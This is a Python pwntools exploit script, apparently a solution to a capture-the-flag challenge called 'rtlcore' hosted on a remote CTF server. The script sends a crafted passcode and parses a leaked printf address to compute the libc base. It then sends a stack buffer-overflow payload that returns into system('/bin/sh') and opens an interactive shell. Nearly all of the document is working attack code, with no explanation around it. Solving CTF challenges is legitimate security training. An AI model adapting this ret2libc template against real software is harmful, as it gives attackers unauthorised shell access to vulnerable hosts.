from pwn import *

#p = process("./rtlcore")
p = remote("ctf.j0n9hyun.xyz", 3015)
e = ELF("./rtlcore")
libc = ELF("./libc.so.6")
bss = e.bss()
read_plt = e.plt['read']

pr = 0x08048683         # system( "/bin/sh" ) 

#<-- gdb -->

script =  '''
b *main + 81
b *check_passcode
b *main + 96
b *core
b *0x8048684
c
c
c
c
'''

#gdb.attach(p, script)

#<-- gdb -->

# -- passcode start --
code = 0xc0d9b0a7

passkey  = "\x21" + "\x23" + "\x2b" + "\x26"  
passkey += "\x21" + "\x23" + "\x2b" + "\x26"  
passkey += "\x21" + "\x23" + "\x2b" + "\x26"  
passkey += "\x21" + "\x23" + "\x2b" + "\x26"  
passkey += "\x23" + "\x24" + "\x2d" + "\x28"  
p.sendline(passkey)

# -- passcode end --

# <-- system addr get start -->
log.success(p.recvline())
log.success(p.recvline())
log.success(p.recvline())
p.recvuntil("0x")
print_addr = int(p.recv(8),16)

base = print_addr - libc.symbols['printf']    
binsh = base + list(libc.search('/bin/sh'))[0]
system_addr = base + libc.symbols['system']   

# <-- system addr get end -->


# -- payload start --

dummy = "\x90" * (0x3e + 0x4)
payload  = dummy
payload += p32(system_addr)
payload += p32(0x41414141)
payload += p32(binsh)

# -- payload end --


p.sendline(payload)

#raw_input()


p.interactive()
